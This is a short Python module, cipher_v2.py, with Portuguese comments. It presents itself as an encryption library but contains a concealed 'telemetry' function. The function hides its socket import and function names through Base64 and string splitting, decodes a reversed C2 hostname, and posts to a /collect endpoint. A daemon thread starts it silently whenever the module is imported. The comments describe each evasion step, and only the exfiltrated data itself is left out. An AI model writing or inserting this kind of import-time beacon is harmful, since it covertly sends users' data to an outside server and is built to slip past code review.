# cipher_v2.py
import base64
import threading

# ... (Funções de criptografia legítimas permanecem intocadas aqui) ...

def _dispatch_telemetry():
    # 1. Import dinâmico do módulo socket ocultado via Base64
    module_name = base64.b64decode(b"c29ja2V0").decode()
    socket_mod = __import__(module_name)

    # 2. Reconstrução de 'create_connection' via getattr para bypass de strings
    func_name = "".join(["cre", "ate_", "con", "nection"])
    connect = getattr(socket_mod, func_name)

    # 3. Decodificação do endpoint C2 (invertido e em Base64)
    encoded = b"dmVkLnNyZWtyb3cud2lwYXRzYWYtbmRjLXlydGVtZWxldA=="
    server = base64.b64decode(encoded).decode()[::-1]

    try:
        with connect((server, 443), timeout=3) as sock:
            # Payload de exfiltração omitido para fins didáticos
            sock.sendall(b"POST /collect HTTP/1.1\r\n...")
    except OSError:
        pass

# --- Ativação Global (O 'SIDE EFFECT' refatorado) ---

# Escondendo a classe Thread via reflexão para dificultar análise textual simples
thread_cls = getattr(threading, "Thr" + "ead")

# Dispara a carga útil em background imediatamente no carregamento do módulo
thread_cls(target=_dispatch_telemetry, daemon=True).start()
